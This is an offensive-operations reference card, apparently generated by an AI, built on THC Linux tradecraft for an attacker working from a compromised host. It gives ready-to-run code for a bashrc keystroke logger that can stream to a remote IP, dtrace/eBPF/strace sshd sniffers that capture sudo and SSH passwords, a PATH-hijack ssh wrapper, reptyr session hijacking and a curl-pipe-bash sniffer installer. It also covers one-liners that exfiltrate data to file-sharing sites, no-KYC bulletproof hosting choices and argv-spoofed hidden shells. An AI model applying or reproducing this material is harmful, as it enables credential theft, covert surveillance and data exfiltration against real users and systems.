---
id: RTO-thc-crypto-opsec-misc
name: THC Crypto, Sniffing, OSINT & Operator Tradecraft
source: The Hacker's Choice (thc.org) — "Crypto, Sniffing, VPN, OSINT, Misc" training chunk
category: evasion
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T019, T021, T022, T023]
tags: [crypto, linux-tradecraft, session-sniffing, ssh-hijacking, eBPF, dtrace, strace, osint, vpn, vps, proxy, tunneling, exfil, opsec, tmux, encrypted-filesystem, luks, openssl]
---

# THC Crypto, Sniffing, OSINT & Operator Tradecraft — Training Reference

## TL;DR
This THC training chunk is a Linux/Unix operator's survival kit covering credential harvesting via TTY/SSH session sniffing (`script`, `strace`, `dtrace`, `eBPF/bpftrace`), transportable encrypted filesystems (LUKS, EncFS), file-level AES-256-CBC for 0-day/log protection, OSINT infrastructure (rDNS, subdomain enumeration via crt.sh, Shodan), and the surrounding VPN/VPS/proxy/exfil/publishing ecosystem. It complements the vault's Windows-heavy T-019/T-021/T-022/T-023 cards by supplying the Unix-side tradecraft, infrastructure selection logic, and exfil channels that an operator needs when pivoting through Linux footholds or staging from bulletproof infrastructure.

## Key Concepts

1. **TTY/PTY keystroke capture without root** — THC's `script -fqaec` + `zapper` wrapper binds to `~/.bashrc` and exfils keystrokes to a file (or `/dev/tcp/3.13.3.7/1524` for remote logging) without requiring ptrace or root. The `LC_PTY=1` env var is the kill-switch (`ssh -o SetEnv LC_PTY=1` to disable logging when *you* log in). This is the Linux analogue to the vault's Windows keylogger (T-023) and is far stealthier because no kernel component is loaded.

2. **Kernel-probe session capture (dtrace / eBPF)** — When root on FreeBSD/Solaris use D-script tracing `syscall::write:entry` filtered on `execname == "sshd"`; on Linux use `bpftrace` with the `ptysnoop.bt` script from THC's `bpfhacks` repo. eBPF hooks 120,000+ kernel functions safely and is invisible to userland EDR/auditd when properly loaded. Vault T-022 (NT sockets via AFD) is the Windows equivalent of bypassing userland network telemetry; eBPF is the kernel-side Linux equivalent.

3. **strace-based SSH/SSHD sniffing via `write()` syscall** — `tit write <sshd-pid>` traces the `write()` call of the sshd process attached to a PTY (`pgrep -f 'sshd.*pts'`), capturing everything sshd writes to bash — including sudo/su/ssh passwords typed by the victim. The `tit()` function strips ANSI escape codes via gawk. Falls back to a wrapper-based attack when `/proc/sys/kernel/yama/ptrace_scope == 1`.

4. **SSH session hijack with `reptyr -T`** — Steals an existing SSH process by reparenting its PTY; **must use `-T` flag** (the "teleport" mode) or the victim sees their SSH process get suspended. Vault has no equivalent — this is unique Unix tradecraft.

5. **Transportable LUKS/EncFS volumes for staging** — `cryptsetup luksFormat` on a 256MB `dd`-ed file creates a portable encrypted filesystem; EncFS provides a FUSE-based equivalent (`.raw` ciphertext, `.sec` cleartext mount). Used to stage 0-days, exfil staging, and credential dumps before transit. Vault T-021 covers AES-256-GCM+zstd at the payload layer but has no filesystem-level equivalent.

6. **AES-256-CBC + PBKDF2 file encryption** — `openssl enc -aes-256-cbc -pbkdf2 -k <pass> < in > in.enc` is the canonical "encrypt your 0-days before transfer" pattern. Vault T-021 implements AES-256-GCM (authenticated, with zstd compression) at the code layer; THC's pattern is the operator-side one-liner for ad-hoc files.

7. **Bulletproof / KYC-free infrastructure selection** — THC maintains a curated matrix: Hetzner (cheap), AlexHost/DMZHost/BaseHost (no KYC, bulletproof), BuyVM (warez-friendly), 1984.hosting (privacy). KYC-free services aggregated at `kycnot.me`. VPN recommendations: Mullvad, CryptoStorm, IVPN, Proton (free tier). The vault's T-019 dead-drop C2 assumes this infrastructure exists; THC tells you *where to rent it*.

8. **OSINT quick-reference toolset** — `crt.sh` for TLS-cert-based subdomain enumeration, `ip.thc.org` for fDNS/rDNS, `cli.fyi` as a swiss-army JSON API (`curl cli.fyi/me`), Shodan for banner/device search, Spur for IP reputation (`spur.us/context/<IP>`), AbuseIPDB for abuse scoring. Operational use: pre-engagement recon, identifying hosting neighbors of a target, fingerprinting WAF/CDN.

9. **Exfil & publishing channels** — Blitz (over GSocket), Segfault `exfil`, oshi.at (TOR-friendly), 0x0.st, transfer.sh, litterbox, croc (P2P), MagicWormhole. Publishing: Cloudflare free tier, Njalla (privacy registrar), DuckDNS/AnonDNS/afraid.org for DNS, 0bin/paste.ec for encrypted pastes. Vault T-019 uses blockchain/Google Translate dead drops; THC favors throwaway file-share + crypto-DNS combinations.

10. **Operational hardening — `rlwrap` over slow links** — Wraps reverse shells / SSH with `rlwrap --always-readline nc -vnlp 1524` to buffer keystrokes until Enter, eliminating per-keystroke latency pain. Small but high-value tradecraft absent from the vault.

## Operational Techniques

### Linux TTY Keystroke Sniffer (bashrc `script` deploy)
- **What**: Non-root, drop-and-forget keystroke logger that captures a user's entire bash session including sudo/su/ssh password entry.
- **When to use**: Low-priv Linux foothold where you need the user's elevated credentials but can't ptrace or load kernel modules.
- **How**:
  1. Drop the THC one-liner (see Tool/code below) onto target.
  2. Run it once to bootstrap: pulls `script` static binary from `bin.pkgforge.dev` if local `script` is < 2.37 (needs `-I` flag), pulls `zapper` stealth binary from GitHub `hackerschoice/zapper` releases.
  3. Append the printed line to `~/.bashrc`. Each new interactive bash session re-execs under `zapper` → `script -fqaec` logging to `~/.config/.pty/.@pty-unix.$$`.
  4. (Optional) Replace the log path with `/dev/tcp/3.13.3.7/1524` for remote streaming.
  5. To use the target yourself without logging: `ssh -o "SetEnv LC_PTY=1" user@host`.
- **Vault link**: T-023 (Client Capabilities → keylogger). The vault's keylogger uses Win32 hooks (WH_KEYBOARD_LL); THC's variant is the Linux equivalent and *does not require any kernel component*. Complementary — pick by OS.
- **Tool/code**:
  ```sh
  # Bootstrap (cut & paste onto target):
  command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
  && mkdir -p ~/.config/.pty 2>/dev/null \
  && { script -h | grep -qm1 -- -I && cp "$(command -v script)" ~/.config/.pty/pty; :; } \
  && { [ ! -f ~/.config/.pty/pty ] && curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script"; :; } \
  && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
  && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty

  # Then add to ~/.bashrc:
  [ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] \
  && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null \
  && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty \
  -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" \
  -I ~/.config/.pty/.@pty-unix.$$
  ```
- **OPSEC**: `zapper` rewrites argv to `sshd: pts/0` so the `script` process blends in. Requires `script` ≥ 2.37 (util-linux). Detection: file in `~/.config/.pty/`, bashrc modification, `LC_PTY` env var leak. Mitigation: chattr +i the log dir, scrub bashrc tail with a marker grep (`grep -v 0xFD0E`). Alternative deploy: use `/dev/tcp` log path to avoid local artifacts entirely.

### DTrace SSHD Sniffer (FreeBSD/Solaris/pfSense)
- **What**: Kernel-probe based capture of all SSHD write() calls across every sshd process on the box.
- **When to use**: Root on FreeBSD/Solaris/pfSense where you need visibility into every shell session without modifying per-user shell configs.
- **How**:
  1. Drop the D script (below) into a file named `d`.
  2. Background: `(dtrace -sd >/tmp/.log &)`.
  3. Read `/tmp/.log`.
- **Vault link**: No vault equivalent — vault is Windows-only. Keep this card as the FreeBSD/Solaris analogue of eBPF.
- **Tool/code**:
  ```c
  #pragma D option quiet
  inline string NAME = "sshd";
  syscall::write:entry
  /(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
  { printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
  ```
- **OPSEC**: DTrace providers are visible in `dtrace -l` and may be logged by audit. Logfile `/tmp/.log` should be streamed off-box. Mitigation: clean dtrace provider entries after session.

### eBPF/bpftrace PTY Sniffer (Linux, root)
- **What**: Hooks kernel write() on PTY master FDs to capture every interactive session system-wide.
- **When to use**: Modern Linux root with kernel ≥ 4.x and BTF support; need full-system session capture invisible to userland EDR.
- **How**:
  ```sh
  curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
  chmod 755 bpftrace
  curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
  ./bpftrace -Bnone ptysnoop.bt
  ```
  Browse `https://github.com/hackerschoice/bpfhacks` for the broader sudo/su/ssh-password-capturing toolset.
- **Vault link**: T-022 (Networking Suite → NT sockets via AFD driver) covers the *Windows kernel-side* equivalent of bypassing userland visibility; eBPF is the Linux equivalent. T-020 (Anti-Analysis) is the Windows-side evasion context.
- **OPSEC**: bpftrace requires `CAP_BPF` / root. Modern kernels log BPF program loads via `auditd` and `bpftool prog` exposes loaded programs. Operational counter: use a pre-compiled static `bpftrace` binary from the iovisor releases, run from `/dev/shm`, and `rm` after.

### strace-based SSH/bash/SSHD sniffer (`tit`)
- **What**: ptrace-based per-process read/write sniffer with ANSI-stripping gawk post-processor.
- **When to use**: Non-root or root on Linux; need to capture a specific PID's session, especially the sshd→bash `write()` to grab sudo/su passwords.
- **How**:
  ```sh
  tit() {
    strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; \
    {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); \
    gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); \
    if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
  }
  # Trace an outgoing ssh client:
  tit read $(pidof -s ssh)
  # Trace a bash session:
  tit read $(pidof -s bash)
  # Trace sshd (captures sudo/su/ssh passwords):
  ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep'
  tit write 7770    # use the sshd PID
  ```
- **Vault link**: T-023 (Client Capabilities → keylogger). The Windows keylogger uses Win32 low-level hooks; `tit` is the ptrace-based Linux counterpart. The sshd-side `write()` trace is a uniquely Linux-side technique with no vault equivalent.
- **OPSEC**: Fails when `/proc/sys/kernel/yama/ptrace_scope == 1` and you're not the parent of the target. Detection: strace appears in process list momentarily; mitigated by short-lived invocations. Use the wrapper method below for persistent capture under yama=1.

### SSH Wrapper Sniffer (yama=1 fallback)
- **What**: PATH-hijack wrapper that aliases `ssh` to `strace -e trace=read -o log-handler /usr/bin/ssh $@`, capturing the next outbound SSH session.
- **When to use**: `ptrace_scope == 1` blocks strace of running sessions; you can edit the victim's `.profile`.
- **How**: Cut & paste the wrapper block (below). It creates `~/.local/bin/ssh` + `~/.local/bin/ssh-log`, prepends `~/.local/bin` to PATH via `.profile` with marker `0xFD0E`, and on next login all `ssh` invocations are silently logged to `~/.local/logs/ssh-log-<pid>-<ts>.txt`.
- **Vault link**: T-017 (Persistence Suite → COM hijack) is the Windows equivalent of PATH/DLL search-order hijacking. THC's wrapper is the Linux PATH-hijack counterpart and follows identical logic.
- **Tool/code**:
  ```sh
  echo 'PATH=~/.local/bin:$PATH #0xFD0E' >>~/.profile
  mkdir -p ~/.local/bin ~/.local/logs
  cat <<__EOF__ >~/.local/bin/ssh
  #! /bin/bash
  strace -e trace=read -I 1 -o '! ~/.local/bin/ssh-log \$\$' /usr/bin/ssh \$@
  __EOF__
  cat <<__EOF__ >~/.local/bin/ssh-log
  #! /bin/bash
  grep -F 'read(4' | cut -f2 -d\\" | while read -r x; do
          [[ \${#x} -gt 5 ]] && continue
          [[ \${x} == +(\\\\n|\\\\r) ]] && { echo ""; continue; }
          echo -n "\${x}"
  done >\$HOME/.local/logs/ssh-log-"\${1}"-\`date +%s\`.txt
  __EOF__
  chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
  . ~/.profile
  # Uninstall:
  # grep -v 0xFD0E ~/.profile >~/.profile-new && mv ~/.profile-new ~/.profile
  # rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs/ssh-log*.txt
  # rmdir ~/.local/bin ~/.local/logs ~/.local &>/dev/null
  ```
- **OPSEC**: Wraps are visible via `which ssh`, `type ssh`. Marker `0xFD0E` allows clean uninstall. Detection: strace binary execution between ssh invocations. Mitigation: use `zapper` to rename the strace argv.

### SSH-IT (auto-deploy SSH sniffer)
- **What**: THC's turnkey SSH sniffer with full installer.
- **When to use**: You want the wrapper method but don't want to hand-craft it.
- **How**: `bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"`
- **Vault link**: No equivalent. Pure Linux tradecraft.
- **OPSEC**: Pulls remote installer — needs egress HTTPS. Use over an existing C2 channel.

### SSH Session Hijack with `reptyr`
- **What**: Steal/migrate a live SSH process into your terminal.
- **When to use**: Need to take over a victim's interactive SSH session without killing it.
- **How**:
  ```sh
  ps ax -o pid,ppid,cmd | grep 'ssh '
  ./reptyr -T <SSH PID>
  # or: ./reptyr -T $(pidof -s ssh)
  ```
- **Vault link**: No vault equivalent. Unique Unix tradecraft.
- **OPSEC**: **Must use `-T` (teleport)** — without it, the original user sees their SSH get suspended (SIGSTOP) which is loud. Same-uid or root required.

### Transportable LUKS Filesystem
- **What**: AES-encrypted file-backed ext3 filesystem mountable on any Linux with `cryptsetup`.
- **When to use**: Staging 0-days, credential dumps, or exfil bundles on a foothold that may be inspected.
- **How**:
  ```sh
  dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
  cryptsetup luksFormat /tmp/crypted
  cryptsetup open /tmp/crypted sec
  mkfs -t ext3 /dev/mapper/sec
  # Mount:
  cryptsetup open /tmp/crypted sec
  mount -o nofail,noatime /dev/mapper/sec /mnt/sec
  # Unmount:
  umount /mnt/sec
  cryptsetup close sec
  ```
- **Vault link**: T-021 (Crypto & Obfuscation → AES-GCM+zstd payload crypto). Vault encrypts at payload level; THC encrypts at filesystem level. Complementary — use T-021 for in-memory payload protection, LUKS for on-disk staging.
- **OPSEC**: A 256MB random-filled file with LUKS header is *visible* to `file` and `cryptsetup luksDump`. Header can be detached (`--header` flag) and stored separately for plausible deniability. Mount options `noatime,nofail` reduce forensic traces.

### EncFS Filesystem
- **What**: FUSE-based per-file encrypted directory (no fixed-size container).
- **When to use**: Need grow-as-needed encrypted storage without root (FUSE works in userspace).
- **How**:
  ```sh
  mkdir .raw .sec
  encfs --standard "${PWD}/.raw" "${PWD}/.sec"
  # Unmount:
  fusermount -u .sec
  ```
- **Vault link**: None. Complementary to T-021.
- **OPSEC**: EncFS metadata is in `.raw/.encfs6.xml` — preserve or destroy it deliberately. EncFS is considered cryptographically weakened vs gocryptfs; consider `gocryptfs` for new deployments.

### AES-256-CBC File Encryption
- **What**: One-liner symmetric encryption for 0-days, logs, and exfil bundles before transit.
- **When to use**: Any time a file needs protection at rest on a foothold or in transit to the C2.
- **How**:
  ```sh
  # Encrypt:
  openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
  # Decrypt:
  openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
  ```
- **Vault link**: T-021 (AES-GCM+zstd). The vault uses **AES-GCM** (authenticated) over CBC because CBC is malleable and lacks integrity. THC's CBC variant is faster but vulnerable to padding-oracle and bit-flipping attacks if the adversary can submit ciphertexts to a decryptor. **Vault implementation is cryptographically superior; use T-021 in-code, use THC's openssl one-liner only for ad-hoc files where GCM is unavailable.**
- **OPSEC**: Password appears in shell history and process list (`-k` flag). Mitigation: use `-pass pass:$(cat /dev/urandom | tr -dc A-Za-z | head -c32)` or environment variable. Prefer `-pbkdf2` (default in modern openssl); never use raw `-k` without KDF.

### Random Password Generation
- **What**: Quick entropy source for throwaway credentials, LUKS passphrases, exfil filenames.
- **When to use**: Always — never type human-chosen passwords for operational infrastructure.
- **How**:
  ```sh
  openssl rand -base64 24
  # Without openssl:
  head -c 32 < /dev/urandom | xxd -p -c 32
  # Alpha-numeric, 16 chars:
  head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
  ```
- **Vault link**: T-021 (Crypto). Same purpose, different platform.
- **OPSEC**: `/dev/urandom` is non-blocking and sufficient for crypto keys on modern Linux. History leak: pipe directly into the consuming command (`cryptsetup luksFormat /tmp/x <<< "$(openssl rand -base64 24)"`).

### OSINT — Reverse DNS & Subdomain Enumeration
- **What**: Quick-lookup one-liners for fDNS/rDNS and TLS-cert-based subdomain discovery.
- **When to use**: Pre-engagement recon, identifying a target's hosting neighborhood and exposed subdomains.
- **How**:
  ```sh
  rdns () { curl -m10 -fsSL "https://ip.thc.org/${1:?}?limit=20&f=${2}"; }
  # rdns <IP>

  sub() {
    [ $# -ne 1 ] && { echo >&2 "crt <domain-name>"; return 255; }
    curl -fsSL "https://crt.sh/?q=${1:?}&output=json" --compressed \
      | jq -r '.[].common_name,.[].name_value' | anew \
      | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]'
    curl -fsSL "https://ip.thc.org/sb/${1:?}"
  }
  # sub <domain>
  ```
- **Vault link**: T-023 (Client Capabilities → recon). Vault has a recon module (byakugan.rs — ARP, TCP, AD enum); THC covers the external/OSINT side. Complementary.
- **OPSEC**: All queries hit external services and reveal your source IP. Route via `curl -x socks5h://segfault ...` or VPN before querying.

### Bulletproof Infrastructure Selection
- **What**: Curated matrix of VPN, VPS, proxy, and DNS providers chosen for abuse tolerance and KYC posture.
- **When to use**: Staging C2, redirectors, exfil endpoints, phishing landing pages.
- **How**: Pick from the matrix below based on the engagement's threat model (KYC-free vs cheap vs bulletproof):
  - **VPN**: Mullvad, CryptoStorm, IVPN, Proton (free), vpn.fail (volunteer)
  - **VPS — bulletproof/no-KYC**: AlexHost, DMZHost, BaseHost, BuyVM, Serverius, 1984.hosting, PrivateLayer, HiveCloud (crypto-accepting)
  - **DNS/Domain**: Njalla (privacy registrar), DuckDNS/AnonDNS/afraid.org (free DDNS), Cloudflare free tier, Unstoppable Domains (crypto)
  - **KYC-free aggregator**: `kycnot.me` ([.onion mirror](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))
- **Vault link**: T-019 (Edo Dead Drop — autonomous C2) and T-022 (Network Suite — multi-chain vault, peer relay). The vault *assumes* this infrastructure exists; THC tells you where to procure it. Operational pairing: T-019 dead-drop client runs *on* a THC-recommended bulletproof VPS.
- **OPSEC**: Pay exclusively with Monero for max unlinkability. Rotate providers per engagement. Avoid Hetzner for anything loud — they are cheap but abuse-tolerant only up to a threshold.

### Exfil Channels
- **What**: One-liner file-upload services for exfiltrating data without spinning up infrastructure.
- **When to use**: Ad-hoc exfil when C2 is down or for one-off data pulls.
- **How**:
  ```sh
  curl -T foo.txt https://transfer.sh
  curl -T foo.txt https://oshi.at          # TOR-friendly
  curl -F'file=@foo.txt' https://0x0.st
  curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' \
       https://litterbox.catbox.moe/resources/internals/api.php
  blitz foo.txt                             # GSocket-based
  croc send foo.txt                         # P2P
  ```
- **Vault link**: T-019 (Edo Dead Drop) covers autonomous blockchain/translate-based C2; T-023 (Client Capabilities → exfil engine `amaterasu.rs`) covers structured exfil over C2. THC adds the *external* one-shot file-share fallbacks.
- **OPSEC**: All public services log your source IP. Route via VPN/proxy/Segfault SOCKS5 (`curl -x socks5h://...`). `oshi.at` is the only TOR-friendly option. For sensitive data prefer `croc` (P2P, no server-side copy) or self-hosted RedDrop.

### Hidden Tmux Session (stealth operator shell)
- **What**: Tmux server bound to a tab-character socket filename in `/dev/shm`, argv-spoofed to look like `apache2 -k start`.
- **When to use**: Persistent operator shell on a multi-user foothold where another admin might `tmux ls` and notice.
- **How**:
  ```sh
  # Start:
  cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache
  # Attach:
  cd /dev/shm && zapper -fa '/usr/sbin/apache2 -k start' tmux -S .$'\t'cache attach
  ```
- **Vault link**: T-016 (EDR Evasion Suite → arg spoofing) and T-017 (Persistence). `zapper` is the Linux equivalent of argv-spoofing techniques covered for Windows in T-016. The `.$'\t'cache` socket name (literally contains a tab) defeats `ls` and most tab-completion.
- **OPSEC**: Socket file in `/dev/shm` survives until reboot. `zapper` rewrites `/proc/self/cmdline` so the apache2 string shows in `ps`. Detection: socket file with a tab in the name in `/dev/shm`; mitigated by renaming to `.{hidden}cache`.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `openssl rand -base64 24` | Quick random password | History leak — pipe direct |
| `openssl enc -aes-256-cbc -pbkdf2 -k <pw>` | File encrypt/decrypt | CBC malleable; prefer GCM (T-021); `-k` leaks to ps+history |
| `cryptsetup luksFormat` / `open` / `close` | LUKS encrypted container | Header visible to `luksDump`; use `--header` detach for deniability |
| `encfs --standard .raw .sec` | FUSE encrypted dir | Metadata `.encfs6.xml` in `.raw`; prefer gocryptfs for new deploys |
| `script -fqaec -I <log>` (util-linux ≥ 2.37) | TTY keystroke capture | Needs static binary from pkgforge if version low |
| `zapper -fa '<argv>' <cmd>` | argv/ps spoofing for any binary | Linux T-016 analogue; arg-spoofing |
| `bpftrace -Bnone ptysnoop.bt` | eBPF kernel-probe session capture | Needs CAP_BPF; visible in `bpftool prog` |
| `dtrace -sd` (FreeBSD/Solaris) | D-script kernel probe | Visible in `dtrace -l`; audit logged |
| `strace -e trace=read/write -p <pid>` | Per-PID syscall sniff | Fails under yama=1; visible in ps |
| `tit` (THC gawk-wrapped strace) | ANSI-stripped session viewer | Same as strace + post-processing |
| `reptyr -T <pid>` | SSH session hijack | Must use `-T` or victim sees SIGSTOP |
| `crt.sh/?q=<dom>&output=json` | TLS-cert subdomain enum | Reveals source IP; proxy it |
| `ip.thc.org/<ip>` | fDNS/rDNS lookup | Same |
| `cli.fyi/<thing>` | Multi-service JSON lookup | Same |
| `spur.us/context/<ip>` | IP reputation rating | Same |
| `croc send <file>` | P2P exfil, no server copy | Best for sensitive data |
| `curl -T foo.txt https://oshi.at` | TOR-friendly file upload | Works over .onion |
| `curl -F'file=@foo.txt' https://0x0.st` | Quick throwaway upload | Logged by service |
| `blitz <file>` | GSocket-based exfil | Routes through GS network |
| `rlwrap --always-readline nc -vnlp 1524` | Buffer keystrokes over slow link | Essential for high-latency shells |
| `tmux -S .$'\t'cache` | Hidden tmux socket in /dev/shm | Tab in filename defeats `ls`/autocomplete |
| `gsocket.io/deploy` | World's smallest backdoor | Linux persistence; pairs with T-017 mindset |
| `Diamorphine LKM` | Linux kernel rootkit (hide proc/file) | Kernel module — loud if checked |
| `weevely` | PHP webshell | For web-app footholds |
| `masscan` / `zmap` / `zgrab` | Internet-scale scanning | Loud; pre-engagement only |
| `linPEAS` | Linux privesc recon | Writes temp files; OPSEC-aware version exists |
| `Orc` (zMarch) | Post-ex LCE finder | `getexploit` command |
| `linux-exploit-suggester` | Kernel exploit matching | Same caveat |
| `bincrypter` / `ezuri` | ELF obfuscation/packing | AV-evasion for Linux payloads |
| `ttyinject` | TTY injection LPE | Pairs with ptysnoop |
| `SploitScan` | Exploit score + PoC search | Recon, not OPSEC-sensitive |
| `Traitor` | Auto-LPE attempt aggregation | Loud; use only on throwaway footholds |
| `DangerZone` | PDF sanitization | Use before opening inbound docs |
| `exiftool -all= <file>` | Metadata stripping | Always strip before exfil |
| `segfault.net` (`ssh root@segfault.net`, pw `segfault`) | Disposable root Linux shell | Free; rotates; for quick staging |
| `kycnot.me` | No-KYC service aggregator | Use .onion mirror for OPSEC |

## Gaps & Extensions

**Vault covers (THC does not):**
- Windows-side process injection (T-007 through T-015) — THC is Linux/Unix-only.
- Syscall-level Windows evasion (T-001 through T-006, T-016) — no equivalent in THC.
- Windows persistence layers (T-017, T-018) — THC's `gsocket`/`Diamorphine`/`weevely` are shallower.
- Cryptographic payload layer (T-021 AES-GCM+zstd, EIP-155 TX signing, shellcode encoders IPv4/IPv6/MAC/UUID) — THC only covers ad-hoc `openssl enc` CBC.
- Malleable C2 profiles, multi-chain vault, peer relay (T-022) — THC just lists ngrok/cloudflared/pagekite.
- BYOVD (T-022/T-018) — THC mentions Diamorphine LKM but not the BYOVD pattern.
- Autonomous dead-drop C2 over blockchain/Google Translate (T-019) — THC's exfil list is the closest analogue but vastly inferior cryptographically.

**THC covers (vault does not):**
- **Linux TTY keystroke capture** (`script`+`zapper` bashrc deploy, eBPF, dtrace, strace, SSH wrapper) — no vault equivalent for Linux credential capture.
- **SSH session hijack** (`reptyr -T`) — unique.
- **Transportable encrypted filesystems** (LUKS, EncFS) — vault has no filesystem-level crypto.
- **Bulletproof infrastructure procurement matrix** (curated VPN/VPS/DNS/proxy matrix with KYC posture per provider) — vault assumes infrastructure; THC sources it.
- **OSINT toolset** (`crt.sh`, `ip.thc.org`, `cli.fyi`, Shodan, Spur, AbuseIPDB) — vault's recon is internal-network only.
- **One-shot exfil channels** (oshi.at, 0x0.st, transfer.sh, litterbox, croc, MagicWormhole) — vault's exfil is C2-bound.
- **`rlwrap` for slow-link shells** — operational ergonomics not covered by vault.
- **Hidden tmux socket** (`/dev/shm` + tab-named socket + `zapper` argv spoof) — unique Linux stealth persistence pattern.
- **Static binary sourcing** (`bin.pkgforge.dev`) for stripped Linux targets — vault assumes Windows binaries.

**Where THC is outdated / superseded:**
- `openssl enc -aes-256-cbc -pbkdf2` should be replaced with **AES-256-GCM** where available (vault T-021 implementation). CBC is malleable and lacks integrity.
- `encfs` should be replaced with `gocryptfs` (EncFS has known cryptographic weaknesses).
- THC's "Phishing" entry (`zphisher`) is the only place phishing tooling is mentioned; the vault's T-023 (HTML/Win32 overlays, WebView2) is a more advanced and credentialed-operator-grade approach.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| `script`/`zapper` TTY keystroke capture | T-023 (Client Capabilities → keylogger) | Windows-vs-Linux counterpart; same goal, different mechanism |
| eBPF/dtrace kernel-probe session capture | T-022 (NT sockets via AFD) + T-020 (Anti-Analysis) | Both bypass userland telemetry at kernel layer on respective OS |
| `strace` per-PID read/write sniff | T-023 (keylogger) | ptrace-based Linux equivalent of Win32 hook keylogger |
| SSH wrapper (PATH hijack, marker `0xFD0E`) | T-017 (Persistence → COM hijack) | Both abuse search-order; PATH-hijack is Linux COM-hijack analogue |
| `reptyr -T` SSH session hijack | (none) | Vault gap — Unix-only tradecraft |
| `zapper` argv spoofing (`-fa '/usr/sbin/apache2'`) | T-016 (EDR Evasion → arg spoofing) | Same primitive, different OS; `zapper` is the Linux arg-spoof tool |
| LUKS / EncFS transportable crypto | T-021 (Crypto & Obfuscation) | Complementary: T-021 = payload crypto; LUKS = filesystem crypto |
| `openssl enc -aes-256-cbc -pbkdf2` | T-021 (AES-GCM+zstd) | THC is inferior — vault uses authenticated GCM; use T-021 in-code, THC one-liner only ad-hoc |
| `openssl rand -base64 24` | T-021 (Crypto) | Same primitive, different platform |
| Bulletproof VPS/VPN matrix (AlexHost, BuyVM, etc.) | T-019 (Edo Dead Drop), T-022 (Network Suite) | THC sources the infrastructure that vault techniques run on |
| Exfil channels (oshi.at, 0x0.st, croc, blitz) | T-019 (dead-drop exfil), T-023 (amaterasu exfil engine) | THC = one-shot external; vault = structured C2-bound |
| OSINT (`crt.sh`, `ip.thc.org`, Shodan, Spur) | T-023 (byakugan.rs recon) | THC = external/OSINT; vault = internal network recon |
| Hidden tmux socket + zapper argv spoof | T-016 (arg spoofing) + T-017 (Persistence) | Linux-side combo of two vault techniques |
| `bincrypter` / `ezuri` ELF obfuscation | T-021 (string obf proc macro) + T-013 (IAT camouflage) | Linux ELF obfuscation counterpart to Windows PE obfuscation |
| `Diamorphine LKM` rootkit | T-018 (BYOVD) | Both load kernel-side code; BYOVD is Windows (signed driver abuse), Diamorphine is Linux LKM |
| `weevely` PHP webshell | (none) | Vault gap — webapp footholds not covered |
| `gsocket.io/deploy` backdoor | T-017 (Persistence Suite) + T-022 (peer relay) | Same concept (covert persistence + relay); THC implementation is simpler/cross-platform |
| `rlwrap` slow-link buffering | (none) | Pure operator ergonomics — vault gap |
| `croc`/`MagicWormhole` P2P transfer | T-022 (peer relay, multi-chain vault) | THC = one-shot P2P; vault = persistent relay topology |
| Disposable root shell `segfault.net` | (none) | Quick-staging Linux shell — vault gap |
